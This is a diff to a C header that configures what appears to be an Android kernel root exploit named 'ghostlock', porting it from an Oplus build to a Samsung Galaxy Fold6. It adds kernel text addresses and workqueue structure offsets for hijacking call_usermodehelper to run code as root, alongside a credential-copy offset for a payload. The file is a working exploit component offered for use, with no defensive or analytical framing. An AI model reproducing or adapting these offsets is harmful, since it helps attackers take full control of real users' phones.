@@ -1,7 +1,7 @@
 #ifndef TARGET_H
 #define TARGET_H
 
-#define BUILD_VARIANT_LABEL "ghostlock_oplus"
+#define BUILD_VARIANT_LABEL "ghostlock_samsung_fold6"
 
 /* Kernel address layout. */
 #define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
@@ -152,9 +152,28 @@
 /* W2 payload. */
 #define CRED_COPY_OFF 0x1080
 
-/* Slide calibration. */
-#define SLIDE_PSELECT_WORD_SHIFT 0
-#define SLIDE_PSELECT_NFDS 320
-#define SLIDE_USE_SELECT 1
+/* Workqueue UMH staging (android14-6.1 BTF layouts; only umh_root devices
+ * use these).  Values verified against the Fold6 vmlinux BTF. */
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d39ccULL
+#define SYSTEM_UNBOUND_WQ_OFF 0x0223ae60ULL
+#define CALL_USERMODEHELPER_EXEC_WORK \
+  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
+#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
+
+#define WQ_DFL_PWQ_OFF 0xb0
+#define PWQ_POOL_OFF 0x00
+#define PWQ_WQ_OFF 0x08
+#define PWQ_WORK_COLOR_OFF 0x10
+#define PWQ_REFCNT_OFF 0x18
+#define PWQ_NR_IN_FLIGHT_OFF 0x1c
+#define PWQ_NR_ACTIVE_OFF 0x5c
+#define PWQ_MAX_ACTIVE_OFF 0x60
+#define POOL_WORKLIST_OFF 0x28
+#define POOL_NR_IDLE_OFF 0x3c
+#define WORK_DATA_OFF 0x00
+#define WORK_ENTRY_OFF 0x08
+#define WORK_FUNC_OFF 0x18
+#define ROOT_UMH_WORK_OFF 0x6000
+#define ROOT_UMH_DATA_OFF 0x6200
 
 #endif
